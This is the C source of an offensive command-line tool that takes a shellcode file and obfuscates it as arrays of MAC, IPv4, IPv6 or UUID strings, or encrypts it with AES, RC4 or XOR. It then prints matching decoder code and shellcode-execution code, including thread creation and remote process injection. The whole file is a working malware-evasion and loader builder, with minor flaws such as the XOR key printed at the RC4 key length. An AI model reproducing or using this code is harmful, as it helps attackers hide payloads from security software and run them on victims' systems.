#include <windows.h>
#include <stdio.h>
#include "Common.h"


// array of supported output (supported input argv[2] encryption/obfuscation type)
CHAR* SupportedOutput[] = { "mac", "ipv4", "ipv6", "uuid", "aes", "rc4", "xor"};

// array of supported output (supported input argv[3] Injection type)
CHAR* SupportedOutput2[] = { "createthread", "process_injection", "registry_injection", "function_pointer"};



// in case we need to make the shellcode multiple of something, we use this function and we make it multiple of *MultipleOf* parameter
// return the base address and the size of the new payload (appeneded payload)
BOOL AppendInputPayload(IN INT MultipleOf, IN PBYTE pPayload, IN DWORD dwPayloadSize, OUT PBYTE* ppAppendedPayload, OUT DWORD* pAppendedPayloadSize) {
	
	PBYTE	Append			= NULL;
	DWORD	AppendSize		= NULL;
	
	// calculating new size
	AppendSize = dwPayloadSize + MultipleOf - (dwPayloadSize % MultipleOf);

	// allocating new payload buffer
	Append = (PBYTE)HeapAlloc(GetProcessHeap(), 0, AppendSize);
	if (Append == NULL)
		return FALSE;

	// filling all with nops
	memset(Append, 0x90, AppendSize);

	// copying the payload bytes over
	memcpy(Append, pPayload, dwPayloadSize);
	
	// returning
	*ppAppendedPayload = Append;
	*pAppendedPayloadSize = AppendSize;
	
	return TRUE;
}



// print help
INT PrintHelp(IN CHAR* _Argv0) {
	printf("\n");
	printf("\t\t\t ######################################\n");
	printf("\t\t\t # Founding - In Search of the Unknown #\n");
	printf("\t\t\t ######################################\n\n");

	printf("[!] Usage: %s <Input Payload FileName> <Enc/Obf *Option*> <Shellcode Execution type> \n\n", _Argv0);
	printf("[i] Enc/Obf Options Can Be: \n");
	printf("\t1.>>> \"mac\"     ::: Output The Shellcode As A Array Of Mac Addresses  [FC-48-83-E4-F0-E8]\n");
	printf("\t2.>>> \"ipv4\"    ::: Output The Shellcode As A Array Of Ipv4 Addresses [252.72.131.228]\n");
	printf("\t3.>>> \"ipv6\"    ::: Output The Shellcode As A Array Of Ipv6 Addresses [FC48:83E4:F0E8:C000:0000:4151:4150:5251]\n");
	printf("\t4.>>> \"uuid\"    ::: Output The Shellcode As A Array Of UUid Strings   [FC4883E4-F0E8-C000-0000-415141505251]\n");
	printf("\t5.>>> \"aes\"     ::: Output The Shellcode As A Array Of Aes Encrypted Shellcode With Random Key And Iv\n");
	printf("\t6.>>> \"rc4\"     ::: Output The Shellcode As A Array Of Rc4 Encrypted Shellcode With Random Key\n");
	printf("\t7.>>> \"xor\"     ::: Output The Shellcode As A Array Of Xor Encrypted Shellcode With Random Key\n\n");
	printf("[i] Shellcode Execution type Options Can Be: \n");
	printf("\t1.>>> \"createthread\"       ::: Executes the  Shellcode using CreateThread\n");
	printf("\t2.>>> \"function_pointer\"   ::: Executes the  Shellcode using Function Pointers\n");
	printf("\t3.>>> \"process_injection\"  ::: Executes the  Shellcode on a remote process\n");

	printf("\n\n[i] ");
	system("PAUSE");
	return -1;

}
//Variables for FreeAllotcate Memory

PBYTE	pPayloadInput = NULL;
PVOID	pCipherText = NULL;
PBYTE	pAppendedPayload = NULL;

int FreeAllocatedMemory()
{
	if (pPayloadInput != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pPayloadInput);
	}

	if (pCipherText != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pCipherText);
	}

	if (pAppendedPayload != NULL && pAppendedPayload != pPayloadInput)
	{
		HeapFree(GetProcessHeap(), 0, pAppendedPayload);
	}

	return 0;
}


int main(int argc, char* argv[]) {



	// data to help us in dealing with user's input
	DWORD	dwType = NULL;
	BOOL	bSupported = FALSE;
	BOOL	bSupported2 = FALSE;

	// variables used for holding data on the read payload 
	
	DWORD	dwPayloadSize = NULL;

	// just in case we needed to append out input payload:
	
	DWORD	dwAppendedSize = NULL;

	// variables used for holding data on the encrypted payload (aes/rc4)
	
	DWORD	dwCipherSize = NULL;

	//End of Function


	// checking input
	if (argc != 4) {
		return PrintHelp(argv[0]);
	}

	// verifying input argv2
	for (size_t i = 0; i < 7; i++) {
		if (strcmp(argv[2], SupportedOutput[i]) == 0) {
			bSupported = TRUE;
			break;
		}
	}

	//ARGV2 Supported
	if (!bSupported) {
		printf("<<<!>>> \"%s\" Is not Valid Input <<<!>>>\n", argv[2]);
		return PrintHelp(argv[0]);
	}

	// verifying input argv3
	for (size_t i = 0; i < 4; i++) {
		if (strcmp(argv[3], SupportedOutput2[i]) == 0) {
			bSupported2 = TRUE;
			break;
		}
	}

	if (!bSupported2) {
		printf("<<<!>>> \"%s\" Is not Valid Input <<<!>>>\n", argv[3]);
		return PrintHelp(argv[0]);
	}



	// reading input payload
	if (!ReadPayloadFile(argv[1], &dwPayloadSize, &pPayloadInput)) {
		return -1;
	}

	// intialize the possible append variables, since later we will deal with these only to print (*GenerateXXXOutput* functions)
	pAppendedPayload = pPayloadInput;
	dwAppendedSize = dwPayloadSize;

	// if mac fuscation is selected

	if (strcmp(argv[2], "mac") == 0) {


		//Terminal Output to a file
		//RedirectStdoutToFile("MAC.c");


		Headers("mac");

		if (dwPayloadSize % 6 != 0) {
			if (!AppendInputPayload(6, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		if (!GenerateMacOutput(pAppendedPayload, dwAppendedSize))
		{
			return -1;
		}

		//wType = MACFUSCATION;
		PrintDecodeFunctionality(MACFUSCATION);

		//Continue Codee
		//freopen("CON", "w", stdout);



		FreeAllocatedMemory();
	}

	if (strcmp(argv[2], "ipv4") == 0) {
		// if payload isnt multiple of 4 we padd it

		//Terminal Output to a file
		//RedirectStdoutToFile("IPV4.c");

		//wType = IPV4FUSCATION;

		Headers("ipv4");

		if (dwPayloadSize % 4 != 0) {
			if (!AppendInputPayload(4, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of ipv4 addresses from new appended shellcode 
		if (!GenerateIpv4Output(pAppendedPayload, dwAppendedSize)) {
			return -1;
		}

		PrintDecodeFunctionality(IPV4FUSCATION);

		//freopen("CON", "w", stdout);


		FreeAllocatedMemory();
	}

	if (strcmp(argv[2], "ipv6") == 0) {
		// if payload isnt multiple of 16 we padd it

		//Terminal Output to a file
		//RedirectStdoutToFile("IPV6.c");

		//wType = IPV4FUSCATION;

		Headers("ipv6");

		if (dwPayloadSize % 16 != 0) {
			if (!AppendInputPayload(16, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}

		// generate array of ipv6 addresses from new appended shellcode 
		if (!GenerateIpv6Output(pAppendedPayload, dwAppendedSize)) {
			return -1;
		}


		PrintDecodeFunctionality(IPV6FUSCATION);

		//freopen("CON", "w", stdout);


		FreeAllocatedMemory();
	}

	if (strcmp(argv[2], "uuid") == 0) {
		// If payload isn't multiple of 16 we pad it

		//Terminal Output to a file
		//RedirectStdoutToFile("UUID.c");

		Headers("uuid");

		//wType = IPV4FUSCATION;



		if (dwPayloadSize % 16 != 0) {
			if (!AppendInputPayload(16, pPayloadInput, dwPayloadSize, &pAppendedPayload, &dwAppendedSize)) {
				return -1;
			}
		}


		// Generate array of uuid addresses from new appended shellcode
		if (!GenerateUuidOutput(pAppendedPayload, dwAppendedSize)) {
			return -1;
		}


		PrintDecodeFunctionality(UUIDFUSCATION);

		//Continue Codee
		//freopen("CON", "w", stdout);


		FreeAllocatedMemory();
	}

	if (strcmp(argv[2], "aes") == 0) {

		CHAR	KEY[AESKEYSIZE], KEY2[AESKEYSIZE];
		CHAR	IV[AESIVSIZE], IV2[AESIVSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, AESKEYSIZE);
		srand(time(NULL) ^ KEY[0]);
		GenerateRandomBytes(IV, AESIVSIZE);

		//saving the key and iv in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, AESKEYSIZE);
		memcpy(IV2, IV, AESIVSIZE);

		Headers("aes");

		if (!SimpleEncryption(pPayloadInput, dwPayloadSize, KEY, IV, &pCipherText, &dwCipherSize)) {
			return -1;
		}


		PrintHexData("AesCipherText", pCipherText, dwCipherSize);
		PrintHexData("AesKey", KEY2, AESKEYSIZE);
		PrintHexData("AesIv", IV2, AESIVSIZE);

		//Terminal Output to a file
		//RedirectStdoutToFile("AES.c");

		PrintDecodeFunctionality(AESENCRYPTION);

		//Continue Codee
		//freopen("CON", "w", stdout);

		FreeAllocatedMemory();
	}

	if (strcmp(argv[2], "rc4") == 0) {

		CHAR	KEY[RC4KEYSIZE], KEY2[RC4KEYSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, RC4KEYSIZE);

		//saving the key in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, RC4KEYSIZE);

		Headers("rc4");

		if (!Rc4EncryptionViSystemFunc032(KEY, pPayloadInput, RC4KEYSIZE, dwPayloadSize)) {
			return -1;
		}

		PrintHexData("Rc4CipherText", pPayloadInput, dwPayloadSize);
		PrintHexData("Rc4Key", KEY2, RC4KEYSIZE);

		//Terminal Output to a file
		//RedirectStdoutToFile("RC4.c");

		PrintDecodeFunctionality(RC4ENCRYPTION);


		//Continue Codee
		//freopen("CON", "w", stdout);

		FreeAllocatedMemory();
	}


	//XOR
	if (strcmp(argv[2], "xor") == 0) {

		CHAR	KEY[XORKEYSIZE], KEY2[XORKEYSIZE];

		srand(time(NULL));
		GenerateRandomBytes(KEY, XORKEYSIZE);

		//saving the key in case it got modified by the encryption algorithm
		memcpy(KEY2, KEY, XORKEYSIZE);

		Headers("xor");

		//XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize)
		if (!XorByInputKey(pPayloadInput, dwPayloadSize, KEY, XORKEYSIZE)) {
			return -1;
		}

		PrintHexData("XORCipherText", pPayloadInput, dwPayloadSize);
		PrintHexData("XORKey", KEY2, RC4KEYSIZE);

		//Terminal Output to a file
		//RedirectStdoutToFile("XOR.c");


		//Print on Terminal
		PrintDecodeFunctionality(XORENCRYPTION);


		//Continue Codee
		//freopen("CON", "w", stdout);

		FreeAllocatedMemory();
	}


	//////////////////////////////////////////////////////////////
	//////////////////////////////////////////////////////////////Injections


	if (strcmp(argv[3], "createthread") == 0) 
	{


		//Terminal Output to a file
		//RedirectStdoutToFile("MAC.c");



		//dwType = CREATETHREAD;
		PrintInjectionFunctionality(CREATETHREAD);


		//freopen("CON", "w", stdout);

		

	}

	if (strcmp(argv[3], "function_pointer") == 0)
	{


		//Terminal Output to a file
		//RedirectStdoutToFile("MAC.c");



		//dwType = CREATETHREAD;
		PrintInjectionFunctionality(FUNCTIONPOINTER);


		//freopen("CON", "w", stdout);



	}

	if (strcmp(argv[3], "process_injection") == 0)
	{


		//Terminal Output to a file
		//RedirectStdoutToFile("MAC.c");



		//dwType = CREATETHREAD;
		PrintInjectionFunctionality(PROCESS_INJECTION);


		//freopen("CON", "w", stdout);



	}

	



	// printing some gap
	printf("\n\n");


}





